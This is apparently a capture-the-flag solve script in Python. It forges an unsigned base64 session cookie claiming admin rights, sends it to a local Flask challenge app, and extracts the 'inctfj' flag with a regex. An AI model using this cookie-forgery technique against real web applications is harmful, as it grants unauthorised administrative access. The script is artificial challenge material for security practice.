from flask.helpers import flash
import requests
import re

url='http://localhost:5000/'
cookie='user=eyJ1c2VybmFtZSI6ICJhc2RmIiwgImFkbWluIjogdHJ1ZX0='

header={'Cookie':cookie}
r=requests.get(url,headers=header).text
flag=re.findall('inctfj{(.*?)}',r)
print('inctfj{'+flag[0]+'}')